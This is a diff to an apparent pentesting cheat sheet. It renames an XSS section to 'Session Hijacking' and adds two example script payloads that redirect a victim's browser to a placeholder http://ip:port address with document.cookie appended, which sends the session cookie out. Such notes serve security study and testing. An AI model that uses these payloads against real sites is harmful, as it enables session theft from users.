@@ -264,8 +264,14 @@ Dom Based
   
 https://malwaredecoder.com/
 
-## XSS - Cookie Hijacking
+## XSS - Session Hijacking
   
+ex:
+  
+\<script type=“text/javascript”>document.location=“http://ip:port/?cookie=“+document.cookie;</script>
+
+\<script>window.location="http://ip:port/?cookie="+document.cookie;</script>
+
 ## Type Juggling
 
 https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf
